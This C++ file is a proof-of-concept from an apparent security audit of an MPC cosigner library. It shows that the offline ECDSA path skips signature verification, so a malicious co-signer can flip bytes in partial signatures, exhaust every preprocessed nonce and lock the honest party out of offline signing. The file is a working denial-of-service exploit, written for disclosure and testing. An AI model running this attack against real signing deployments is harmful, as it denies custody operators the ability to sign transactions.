/*
 * F13: Offline Signing Nonce Exhaustion PoC
 *
 * Demonstrates the full attack chain:
 *   1. Honest parties preprocess N nonces (expensive, ~4 rounds of MTA)
 *   2. Malicious co-signer corrupts partial sigs to burn all N nonces
 *   3. After exhaustion, honest party CANNOT sign offline anymore
 *   4. Recovering requires full re-preprocessing (timed)
 *
 * The online path (get_cmp_signature) calls GFp_curve_algebra_verify_signature
 * and throws on invalid sigs — no state consumed.
 * The offline path (ecdsa_offline_signature) has NO verification — state consumed.
 *
 * Build:
 *   g++ -g -std=c++17 -I include -I src/common -I test -I build/src/common \
 *       -o f13_nonce_exhaustion_poc f13_nonce_exhaustion_poc.cpp \
 *       -L build/src/common -lcosigner -lssl -lcrypto -lpthread -ldl -luuid \
 *       -Wl,-rpath,build/src/common
 *
 * Run:
 *   LD_LIBRARY_PATH=build/src/common ./f13_nonce_exhaustion_poc
 */

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cassert>
#include <chrono>
#include <iostream>
#include <map>
#include <memory>
#include <set>
#include <string>
#include <vector>
#include <mutex>
#include <shared_mutex>
#include <stdarg.h>

#include <uuid/uuid.h>
#include <openssl/rand.h>
#include <openssl/bn.h>

#include "cosigner/cmp_setup_service.h"
#include "cosigner/cmp_ecdsa_offline_signing_service.h"
#include "cosigner/mpc_globals.h"
#include "cosigner/platform_service.h"
#include "cosigner/cmp_key_persistency.h"
#include "cosigner/cosigner_exception.h"
#include "cosigner/types.h"
#include "cosigner/cmp_signature_preprocessed_data.h"
#include "crypto/elliptic_curve_algebra/elliptic_curve256_algebra.h"
#include "crypto/GFp_curve_algebra/GFp_curve_algebra.h"

#include "cosigner/test_common.h"

using namespace fireblocks::common::cosigner;
using Clock = std::conditional<std::chrono::high_resolution_clock::is_steady,
    std::chrono::high_resolution_clock, std::chrono::steady_clock>::type;

extern "C" void sgx_log_printf_style(int level, const char* file, const char* function, int line, const char* message, ...)
{
    (void)level; (void)file; (void)function; (void)line; (void)message;
}

static std::string gen_uuid()
{
    uuid_t uuid;
    uuid_generate(uuid);
    char str[37];
    uuid_unparse_lower(uuid, str);
    return std::string(str);
}

// setup_persistency implementations (same as external_attacker_poc.cpp)

std::string setup_persistency::dump_key(const std::string& key_id) const
{
    auto it = _keys.find(key_id);
    if (it == _keys.end()) throw cosigner_exception(cosigner_exception::BAD_KEY);
    return HexStr(it->second.private_key, &it->second.private_key[sizeof(elliptic_curve256_scalar_t)]);
}

bool setup_persistency::key_exist(const std::string& key_id) const
{
    std::shared_lock lock(_mutex);
    return _keys.find(key_id) != _keys.end();
}

void setup_persistency::load_key(const std::string& key_id, cosigner_sign_algorithm& algorithm, elliptic_curve256_scalar_t& private_key) const
{
    std::shared_lock lock(_mutex);
    auto it = _keys.find(key_id);
    if (it == _keys.end()) throw cosigner_exception(cosigner_exception::BAD_KEY);
    memcpy(private_key, it->second.private_key, sizeof(elliptic_curve256_scalar_t));
    algorithm = it->second.algorithm;
}

const std::string setup_persistency::get_tenantid_from_keyid(const std::string& key_id) const { return TENANT_ID; }

void setup_persistency::load_key_metadata(const std::string& key_id, cmp_key_metadata& metadata, bool full_load) const
{
    std::shared_lock lock(_mutex);
    auto it = _keys.find(key_id);
    if (it == _keys.end()) throw cosigner_exception(cosigner_exception::BAD_KEY);
    metadata = it->second.metadata.value();
}

void setup_persistency::load_auxiliary_keys(const std::string& key_id, auxiliary_keys& aux) const
{
    std::shared_lock lock(_mutex);
    auto it = _keys.find(key_id);
    if (it == _keys.end()) throw cosigner_exception(cosigner_exception::BAD_KEY);
    aux = it->second.aux_keys;
}

void setup_persistency::store_key(const std::string& key_id, cosigner_sign_algorithm algorithm, const elliptic_curve256_scalar_t& private_key, uint64_t ttl)
{
    std::unique_lock lock(_mutex);
    auto& info = _keys[key_id];
    memcpy(info.private_key, private_key, sizeof(elliptic_curve256_scalar_t));
    info.algorithm = algorithm;
}

void setup_persistency::store_key_metadata(const std::string& key_id, const cmp_key_metadata& metadata, bool allow_override)
{
    std::unique_lock lock(_mutex);
    auto& info = _keys[key_id];
    if (!allow_override && info.metadata)
        throw cosigner_exception(cosigner_exception::INTERNAL_ERROR);
    info.metadata = metadata;
}

void setup_persistency::store_auxiliary_keys(const std::string& key_id, const auxiliary_keys& aux)
{
    std::unique_lock lock(_mutex);
    _keys[key_id].aux_keys = aux;
}

void setup_persistency::store_keyid_tenant_id(const std::string& key_id, const std::string& tenant_id) {}

void setup_persistency::store_setup_data(const std::string& key_id, const setup_data& metadata, bool override_flag)
{
    std::unique_lock lock(_mutex);
    _setup_data[key_id] = metadata;
}

void setup_persistency::load_setup_data(const std::string& key_id, setup_data& metadata)
{
    std::shared_lock lock(_mutex);
    if (_setup_data.find(key_id) == _setup_data.end())
        throw cosigner_exception(cosigner_exception::INTERNAL_ERROR);
    metadata = _setup_data[key_id];
}

void setup_persistency::store_setup_commitments(const std::string& key_id, const std::map<uint64_t, commitment>& commitments)
{
    std::unique_lock lock(_mutex);
    if (_commitments.find(key_id) != _commitments.end())
        throw cosigner_exception(cosigner_exception::INTERNAL_ERROR);
    _commitments[key_id] = commitments;
}

void setup_persistency::load_setup_commitments(const std::string& key_id, std::map<uint64_t, commitment>& commitments)
{
    std::shared_lock lock(_mutex);
    commitments = _commitments[key_id];
}

void setup_persistency::delete_temporary_key_data(const std::string& key_id, bool delete_key)
{
    std::unique_lock lock(_mutex);
    _setup_data.erase(key_id);
    _commitments.erase(key_id);
    if (delete_key) _keys.erase(key_id);
}

// create_secret (same as external_attacker_poc.cpp)

class poc_platform : public platform_service
{
public:
    poc_platform(uint64_t id) : _id(id) {}
private:
    void gen_random(size_t len, uint8_t* random_data) const override { RAND_bytes(random_data, len); }
    uint64_t now_msec() const override { return std::chrono::time_point_cast<std::chrono::milliseconds>(Clock::now()).time_since_epoch().count(); }
    const std::string get_current_tenantid() const override { return TENANT_ID; }
    uint64_t get_id_from_keyid(const std::string& key_id) const override { return _id; }
    void derive_initial_share(const share_derivation_args&, cosigner_sign_algorithm, elliptic_curve256_scalar_t*) const override { assert(0); }
    byte_vector_t encrypt_for_player(const uint64_t, const byte_vector_t& data, const std::optional<std::string>& = std::nullopt) const override { return data; }
    byte_vector_t decrypt_message(const byte_vector_t& data) const override { return data; }
    bool backup_key(const std::string&, cosigner_sign_algorithm, const elliptic_curve256_scalar_t&, const cmp_key_metadata&, const auxiliary_keys&) override { return true; }
    void on_start_signing(const std::string&, const std::string&, const signing_data&, const std::string&, const std::set<std::string>&, const signing_type) override {}
    void fill_signing_info_from_metadata(const std::string&, std::vector<uint32_t>& flags) const override
    {
        for (auto& f : flags) f = 0;
    }
    void fill_eddsa_signing_info_from_metadata(std::vector<eddsa_signature_data>&, const std::string&) const override {}
    void fill_bam_signing_info_from_metadata(std::vector<bam_signing_properties>&, const std::string&) const override {}
    bool is_client_id(uint64_t) const override { return false; }
    void mark_key_setup_in_progress(const std::string&) const override {}
    void clear_key_setup_in_progress(const std::string&) const override {}
    void prepare_for_signing(const std::string&, const std::string) override {}
    uint64_t _id;
};

struct poc_setup_info
{
    poc_setup_info(uint64_t id, setup_persistency& persistency) : plat(id), setup_service(plat, persistency) {}
    poc_platform plat;
    cmp_setup_service setup_service;
};

void create_secret(players_setup_info& players, cosigner_sign_algorithm type,
                   const std::string& keyid, elliptic_curve256_point_t& pubkey, uint32_t version)
{
    std::unique_ptr<elliptic_curve256_algebra_ctx_t, void(*)(elliptic_curve256_algebra_ctx_t*)>
        algebra(elliptic_curve256_new_secp256k1_algebra(), elliptic_curve256_algebra_ctx_free);
    const size_t PUBKEY_SIZE = algebra->point_size(algebra.get());
    memset(pubkey, 0, sizeof(elliptic_curve256_point_t));

    std::vector<uint64_t> players_ids;
    std::map<uint64_t, std::unique_ptr<poc_setup_info>> services;
    for (auto i = players.begin(); i != players.end(); ++i) {
        services.emplace(i->first, std::make_unique<poc_setup_info>(i->first, i->second));
        players_ids.push_back(i->first);
    }

    std::map<uint64_t, commitment> commitments;
    for (auto& [id, svc] : services) {
        commitment& c = commitments[id];
        svc->setup_service.generate_setup_commitments(keyid, TENANT_ID, type, players_ids, players_ids.size(), 0, {}, c);
    }

    std::map<uint64_t, setup_decommitment> decommitments;
    for (auto& [id, svc] : services) {
        setup_decommitment& d = decommitments[id];
        svc->setup_service.store_setup_commitments(keyid, commitments, version, d);
    }
    commitments.clear();

    std::map<uint64_t, setup_zk_proofs> proofs;
    for (auto& [id, svc] : services) {
        setup_zk_proofs& p = proofs[id];
        svc->setup_service.generate_setup_proofs(keyid, decommitments, p);
    }
    decommitments.clear();

    std::map<uint64_t, std::map<uint64_t, byte_vector_t>> paillier_large_factor_proofs;
    for (auto& [id, svc] : services) {
        auto& proof = paillier_large_factor_proofs[id];
        svc->setup_service.verify_setup_proofs(keyid, proofs, proof);
    }
    proofs.clear();

    bool first = true;
    for (auto& [id, svc] : services) {
        std::string public_key;
        cosigner_sign_algorithm algorithm;
        svc->setup_service.create_secret(keyid, paillier_large_factor_proofs, public_key, algorithm);
        assert(algorithm == type);
        assert(public_key.size() == PUBKEY_SIZE);
        if (first) {
            first = false;
            memcpy(pubkey, public_key.data(), PUBKEY_SIZE);
        } else {
            assert(memcmp(pubkey, public_key.data(), PUBKEY_SIZE) == 0);
        }
    }
}

// preprocessing_persistency (from external_attacker_poc.cpp)

static uint8_t PREPROC_ZERO[sizeof(cmp_signature_preprocessed_data)] = {0};

class poc_preprocessing_persistency : public cmp_ecdsa_offline_signing_service::preprocessing_persistency
{
public:
    void store_preprocessing_metadata(const std::string& request_id, const preprocessing_metadata& data, bool override_val) override
    {
        std::unique_lock lock(_mutex);
        if (!override_val && _metadata.find(request_id) != _metadata.end())
            throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        _metadata[request_id] = data;
    }
    void load_preprocessing_metadata(const std::string& request_id, preprocessing_metadata& data) const override
    {
        std::shared_lock lock(_mutex);
        auto it = _metadata.find(request_id);
        if (it == _metadata.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        data = it->second;
    }
    void store_preprocessing_data(const std::string& request_id, uint64_t index, const ecdsa_preprocessing_data& data) override
    {
        std::unique_lock lock(_mutex);
        _signing_data[request_id][index] = data;
    }
    void load_preprocessing_data(const std::string& request_id, uint64_t index, ecdsa_preprocessing_data& data) const override
    {
        std::shared_lock lock(_mutex);
        auto it = _signing_data.find(request_id);
        if (it == _signing_data.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        auto idx = it->second.find(index);
        if (idx == it->second.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        data = idx->second;
    }
    void delete_preprocessing_data(const std::string& request_id) override
    {
        std::unique_lock lock(_mutex);
        _metadata.erase(request_id);
        _signing_data.erase(request_id);
    }
    void create_preprocessed_data(const std::string& key_id, uint64_t size) override
    {
        std::unique_lock lock(_mutex);
        auto it = _preprocessed_data.find(key_id);
        if (it != _preprocessed_data.end()) {
            if (it->second.size() != size)
                throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        } else
            _preprocessed_data.emplace(key_id, std::vector<cmp_signature_preprocessed_data>(size));
    }
    void store_preprocessed_data(const std::string& key_id, uint64_t index, const cmp_signature_preprocessed_data& data) override
    {
        std::unique_lock lock(_mutex);
        auto it = _preprocessed_data.find(key_id);
        if (it == _preprocessed_data.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        if (index >= it->second.size()) throw cosigner_exception(cosigner_exception::INVALID_PRESIGNING_INDEX);
        it->second[index] = data;
    }
    void load_preprocessed_data(const std::string& key_id, uint64_t index, cmp_signature_preprocessed_data& data) override
    {
        std::unique_lock lock(_mutex);
        auto it = _preprocessed_data.find(key_id);
        if (it == _preprocessed_data.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        if (index >= it->second.size() || memcmp(it->second[index].k.data, PREPROC_ZERO, sizeof(cmp_signature_preprocessed_data)) == 0)
            throw cosigner_exception(cosigner_exception::INVALID_PRESIGNING_INDEX);
        data = it->second[index];
        memset(it->second[index].k.data, 0, sizeof(cmp_signature_preprocessed_data));
    }
    void delete_preprocessed_data(const std::string& key_id) override
    {
        std::unique_lock lock(_mutex);
        _preprocessed_data.erase(key_id);
    }

    size_t count_available(const std::string& key_id) const
    {
        std::shared_lock lock(_mutex);
        auto it = _preprocessed_data.find(key_id);
        if (it == _preprocessed_data.end()) return 0;
        size_t count = 0;
        for (auto& d : it->second)
            if (memcmp(d.k.data, PREPROC_ZERO, sizeof(cmp_signature_preprocessed_data)) != 0) count++;
        return count;
    }

    mutable std::shared_mutex _mutex;
    std::map<std::string, preprocessing_metadata> _metadata;
    std::map<std::string, std::map<uint64_t, ecdsa_preprocessing_data>> _signing_data;
    std::map<std::string, std::vector<cmp_signature_preprocessed_data>> _preprocessed_data;
};

int main()
{
    printf("\n");
    printf("================================================================\n");
    printf(" F13: OFFLINE SIGNING NONCE EXHAUSTION ATTACK\n");
    printf(" Missing GFp_curve_algebra_verify_signature in offline path\n");
    printf("================================================================\n\n");

    const int NONCE_COUNT = 5;

    // Step 1: Key generation
    printf("=== STEP 1: Key Generation ===\n");
    std::string keyid = gen_uuid();
    elliptic_curve256_point_t pubkey;
    players_setup_info players;
    players[1]; players[2];
    create_secret(players, ECDSA_SECP256K1, keyid, pubkey, MPC_PROTOCOL_VERSION);
    printf("Key: %s\n", keyid.c_str());
    printf("Pubkey: %s...\n\n", HexStr(pubkey, pubkey + 16).c_str());

    // Step 2: Preprocessing (expensive -- measure time)
    printf("=== STEP 2: Preprocessing %d Nonces (expensive operation) ===\n", NONCE_COUNT);
    poc_platform plat1(1), plat2(2);
    poc_preprocessing_persistency pp1, pp2;
    cmp_ecdsa_offline_signing_service offline1(plat1, players[1], pp1);
    cmp_ecdsa_offline_signing_service offline2(plat2, players[2], pp2);

    auto preprocess_start = std::chrono::high_resolution_clock::now();

    std::string req = gen_uuid();
    std::set<uint64_t> player_ids = {1, 2};

    std::map<uint64_t, std::vector<cmp_mta_request>> mta_req;
    offline1.start_ecdsa_signature_preprocessing(TENANT_ID, keyid, req, 0, NONCE_COUNT, NONCE_COUNT, player_ids, mta_req[1]);
    offline2.start_ecdsa_signature_preprocessing(TENANT_ID, keyid, req, 0, NONCE_COUNT, NONCE_COUNT, player_ids, mta_req[2]);

    std::map<uint64_t, cmp_mta_responses> mta_resp;
    offline1.offline_mta_response(req, mta_req, MPC_PROTOCOL_VERSION, mta_resp[1]);
    offline2.offline_mta_response(req, mta_req, MPC_PROTOCOL_VERSION, mta_resp[2]);

    std::map<uint64_t, std::vector<cmp_mta_deltas>> deltas;
    auto saved = mta_resp;
    offline1.offline_mta_verify(req, mta_resp, deltas[1]);
    mta_resp = saved;
    offline2.offline_mta_verify(req, mta_resp, deltas[2]);

    std::string kid;
    offline1.store_presigning_data(req, deltas, kid);
    offline2.store_presigning_data(req, deltas, kid);

    auto preprocess_end = std::chrono::high_resolution_clock::now();
    auto preprocess_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
        preprocess_end - preprocess_start).count();

    printf("Preprocessing completed: %d nonces in %lld ms\n", NONCE_COUNT, (long long)preprocess_ms);
    printf("Cost per nonce: %lld ms (4 rounds of MTA computation)\n", (long long)(preprocess_ms / NONCE_COUNT));
    printf("These nonces are SINGLE-USE: load_preprocessed_data deletes after read.\n");
    size_t avail1 = pp1.count_available(keyid);
    printf("Nonces available (player 1): %zu\n\n", avail1);

    // Signing setup
    byte_vector_t chaincode(32, '\0');
    std::vector<uint32_t> path = {44, 0, 0, 0, 0};
    std::set<std::string> player_strs = {"1", "2"};

    signing_data data;
    memcpy(data.chaincode, chaincode.data(), sizeof(HDChaincode));
    signing_block_data block;
    block.data.insert(block.data.begin(), 32, 'T');
    block.path = path;
    data.blocks.push_back(block);

    std::unique_ptr<elliptic_curve256_algebra_ctx_t, void(*)(elliptic_curve256_algebra_ctx_t*)>
        algebra(elliptic_curve256_new_secp256k1_algebra(), elliptic_curve256_algebra_ctx_free);
    PubKey derived_key;
    derive_public_key_generic(algebra.get(), derived_key, pubkey, data.chaincode, path.data(), path.size());
    elliptic_curve256_scalar_t msg;
    memcpy(msg, data.blocks[0].data.data(), sizeof(elliptic_curve256_scalar_t));

    // Step 3: ATTACK — burn all nonces with corrupted partial sigs
    printf("=== STEP 3: ATTACK -- Malicious Co-signer Burns All Nonces ===\n");
    printf("Attacker (player 2) corrupts their partial sig in each round.\n");
    printf("Offline path has NO signature verification -- accepts corrupted sigs.\n\n");

    int burned = 0;
    for (int i = 0; i < NONCE_COUNT; i++) {
        std::string txid = gen_uuid();
        std::map<uint64_t, std::vector<recoverable_signature>> partial_sigs;

        offline1.ecdsa_sign(keyid, txid, data, "", player_strs, player_ids,
                            i, MPC_PROTOCOL_VERSION, partial_sigs[1]);
        offline2.ecdsa_sign(keyid, txid, data, "", player_strs, player_ids,
                            i, MPC_PROTOCOL_VERSION, partial_sigs[2]);

        // ATTACK: corrupt attacker's partial sig (flip 2 bytes)
        partial_sigs[2][0].s[0] ^= 0xFF;
        partial_sigs[2][0].s[1] ^= 0xAA;

        std::vector<recoverable_signature> final_sigs;
        offline1.ecdsa_offline_signature(keyid, txid, ECDSA_SECP256K1, partial_sigs, final_sigs);

        auto status = GFp_curve_algebra_verify_signature(
            (GFp_curve_algebra_ctx_t*)algebra->ctx, &derived_key, &msg,
            &final_sigs[0].r, &final_sigs[0].s);

        printf("  Nonce %d/%d: ", i + 1, NONCE_COUNT);
        if (status != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
            printf("BURNED -- invalid sig returned (verify error %d), nonce consumed\n", status);
            burned++;
        } else {
            printf("ERROR -- signature unexpectedly valid\n");
        }
    }

    size_t avail_after = pp1.count_available(keyid);
    printf("\n  Nonces burned: %d/%d\n", burned, NONCE_COUNT);
    printf("  Nonces remaining (player 1): %zu\n\n", avail_after);

    // Step 4: Prove the honest party is locked out
    printf("=== STEP 4: LOCKOUT -- Honest Party Cannot Sign ===\n");
    printf("Attempting to sign with exhausted nonce pool...\n\n");

    bool locked_out = false;
    for (int attempt = 0; attempt < NONCE_COUNT + 1; attempt++) {
        std::string txid_fail = gen_uuid();
        std::map<uint64_t, std::vector<recoverable_signature>> fail_sigs;
        try {
            offline1.ecdsa_sign(keyid, txid_fail, data, "", player_strs, player_ids,
                                attempt, MPC_PROTOCOL_VERSION, fail_sigs[1]);
            printf("  Index %d: still accessible (unexpected)\n", attempt);
        } catch (const cosigner_exception& e) {
            locked_out = true;
            printf("  [PASS] Index %d: cosigner_exception (error %d) -- nonce consumed/unavailable\n",
                   attempt, e.error_code());
        } catch (const std::exception& e) {
            locked_out = true;
            printf("  [PASS] Index %d: exception -- %s\n", attempt, e.what());
        }
    }

    if (locked_out) {
        printf("\n  RESULT: Honest party is LOCKED OUT of offline signing.\n");
        printf("  No preprocessed nonces remain. Cannot sign until re-preprocessing.\n");
    }

    // Step 5: Recovery cost
    printf("\n=== STEP 5: RECOVERY -- Re-preprocessing Required ===\n");
    printf("To sign again, honest party must redo full 4-round MTA preprocessing.\n\n");

    auto recovery_start = std::chrono::high_resolution_clock::now();

    poc_preprocessing_persistency pp1_new, pp2_new;
    cmp_ecdsa_offline_signing_service offline1_new(plat1, players[1], pp1_new);
    cmp_ecdsa_offline_signing_service offline2_new(plat2, players[2], pp2_new);

    std::string req2 = gen_uuid();
    std::map<uint64_t, std::vector<cmp_mta_request>> mta_req2;
    offline1_new.start_ecdsa_signature_preprocessing(TENANT_ID, keyid, req2, 0, NONCE_COUNT, NONCE_COUNT, player_ids, mta_req2[1]);
    offline2_new.start_ecdsa_signature_preprocessing(TENANT_ID, keyid, req2, 0, NONCE_COUNT, NONCE_COUNT, player_ids, mta_req2[2]);

    std::map<uint64_t, cmp_mta_responses> mta_resp2;
    offline1_new.offline_mta_response(req2, mta_req2, MPC_PROTOCOL_VERSION, mta_resp2[1]);
    offline2_new.offline_mta_response(req2, mta_req2, MPC_PROTOCOL_VERSION, mta_resp2[2]);

    std::map<uint64_t, std::vector<cmp_mta_deltas>> deltas2;
    auto saved2 = mta_resp2;
    offline1_new.offline_mta_verify(req2, mta_resp2, deltas2[1]);
    mta_resp2 = saved2;
    offline2_new.offline_mta_verify(req2, mta_resp2, deltas2[2]);

    std::string kid2;
    offline1_new.store_presigning_data(req2, deltas2, kid2);
    offline2_new.store_presigning_data(req2, deltas2, kid2);

    auto recovery_end = std::chrono::high_resolution_clock::now();
    auto recovery_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
        recovery_end - recovery_start).count();

    printf("  Recovery preprocessing: %lld ms for %d nonces\n", (long long)recovery_ms, NONCE_COUNT);
    printf("  Nonces now available: %zu\n", pp1_new.count_available(keyid));

    // Step 6: Prove recovery works (legitimate signing succeeds)
    printf("\n=== STEP 6: VERIFY RECOVERY -- Legitimate Signing Succeeds ===\n");

    std::string txid_ok = gen_uuid();
    std::map<uint64_t, std::vector<recoverable_signature>> ok_partial;
    offline1_new.ecdsa_sign(keyid, txid_ok, data, "", player_strs, player_ids,
                            0, MPC_PROTOCOL_VERSION, ok_partial[1]);
    offline2_new.ecdsa_sign(keyid, txid_ok, data, "", player_strs, player_ids,
                            0, MPC_PROTOCOL_VERSION, ok_partial[2]);

    std::vector<recoverable_signature> ok_sigs;
    offline1_new.ecdsa_offline_signature(keyid, txid_ok, ECDSA_SECP256K1, ok_partial, ok_sigs);

    auto verify_ok = GFp_curve_algebra_verify_signature(
        (GFp_curve_algebra_ctx_t*)algebra->ctx, &derived_key, &msg,
        &ok_sigs[0].r, &ok_sigs[0].s);

    if (verify_ok == ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        printf("  [PASS] After re-preprocessing, signing succeeds (valid signature)\n");
    } else {
        printf("  [FAIL] Signature invalid even after recovery (error %d)\n", verify_ok);
    }

    // Summary
    printf("\n================================================================\n");
    printf(" ATTACK SUMMARY\n");
    printf("================================================================\n");
    printf(" Preprocessing cost:     %lld ms for %d nonces\n", (long long)preprocess_ms, NONCE_COUNT);
    printf(" Attack cost:            <1 ms per nonce (just flip 2 bytes)\n");
    printf(" All %d nonces:           destroyed in <1 second\n", NONCE_COUNT);
    printf(" Honest party:           %s\n", locked_out ? "LOCKED OUT until re-preprocessing" : "NOT locked out (unexpected)");
    printf(" Recovery cost:          %lld ms (full 4-round MTA re-preprocessing)\n", (long long)recovery_ms);
    printf("================================================================\n\n");

    printf("Source code evidence:\n");
    printf("  OFFLINE (no verify):\n");
    printf("    cmp_ecdsa_offline_signing_service.cpp:420-477\n");
    printf("    ecdsa_offline_signature() combines partial s values\n");
    printf("    NO call to GFp_curve_algebra_verify_signature()\n\n");
    printf("  ONLINE (does verify):\n");
    printf("    cmp_ecdsa_online_signing_service.cpp:490\n");
    printf("    GFp_curve_algebra_verify_signature(curve, &derived_public_key,\n");
    printf("        &data.message, &sig.r, &sig.s)\n");
    printf("    Throws INTERNAL_ERROR on invalid -- no state consumed\n\n");

    printf("Operational impact:\n");
    printf("  1. Attacker burns all preprocessed nonces instantly\n");
    printf("  2. Honest party cannot sign offline until re-preprocessing\n");
    printf("  3. Re-preprocessing requires 4 rounds of expensive MTA computation\n");
    printf("  4. In production: each round requires network round-trip between parties\n");
    printf("  5. Attacker can repeat immediately after recovery\n");
    printf("  6. Sustained attack = permanent offline signing denial of service\n\n");

    printf("Asymmetry (attacker advantage):\n");
    printf("  Preprocessing: %lld ms (%lld ms/nonce)\n", (long long)preprocess_ms, (long long)(preprocess_ms / NONCE_COUNT));
    printf("  Attack:        ~0 ms (flip 2 bytes in partial sig)\n");
    printf("  Ratio:         Defender cost / Attacker cost = ~%lldx\n",
           (long long)(preprocess_ms > 0 ? preprocess_ms : 1));

    return locked_out ? 0 : 1;
}
